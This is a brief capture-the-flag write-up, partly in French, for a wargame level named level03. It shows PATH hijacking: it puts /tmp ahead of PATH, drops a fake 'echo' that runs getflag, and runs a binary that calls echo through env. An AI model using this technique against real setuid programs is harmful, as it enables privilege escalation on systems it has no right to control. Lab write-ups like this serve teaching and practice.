On peut voir dna slevel03 : system("/usr/bin/env echo xxxx") tells the system to use Env
So we can play the env to get the flag 
--->
PATH=/tmp:$PATH								----- New path
export PATH 								----- Set new path
echo 'getflag' > /tmp/echo 					----- Replace echo by getflag
chmod +x /tmp/echo 							----- make /tmp/echo executable
./level03 									----- Get your flag 
